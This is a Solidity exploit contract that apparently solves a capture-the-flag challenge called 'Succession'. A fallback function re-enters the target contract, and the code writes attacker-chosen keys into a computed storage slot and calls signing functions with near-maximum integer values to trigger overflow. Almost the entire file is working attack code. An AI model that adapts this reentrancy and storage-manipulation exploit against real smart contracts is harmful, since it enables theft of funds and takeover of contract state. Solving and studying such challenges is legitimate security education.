// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ISuccessionCTFVy} from "src/neumoxx-succession/interfaces/ISuccessionCTFVy.sol";

contract ExploiterReentrancy {
    bytes32 constant MARION_KEY = 0x000000000000000000000000000000000000000000000000000000000000bbbb;
    bytes32 constant ANNA_KEY = 0x000000000000000000000000000000000000000000000000000000000000aaaa;
    uint256 immutable keyIndex;
    bool marion;
    bool anna;

    ISuccessionCTFVy successionCTF;

    constructor(address _successionCTF) {
        successionCTF = ISuccessionCTFVy(_successionCTF);
        keyIndex = 3618502788666131106986593281521497120414687020801267626233049500247285301248 - 11
            - uint256(uint160(address(this)));
    }

    function attack() external {
        // init CTF
        successionCTF.initCTF();

        // sign for HenryJunior
        successionCTF.signHenryJunior(address(this), 0);
    }

    fallback() external payable {
        if (!marion) {
            // sign for Marion
            marion = true;
            successionCTF.setKey(keyIndex, MARION_KEY);
            successionCTF.signMarion(address(this), type(uint256).max - 63);
        } else if (!anna) {
            // sign for Anna
            anna = true;
            successionCTF.setKey(keyIndex, ANNA_KEY);
            successionCTF.signAnna(address(this), type(uint256).max - 63);
        }
    }
}
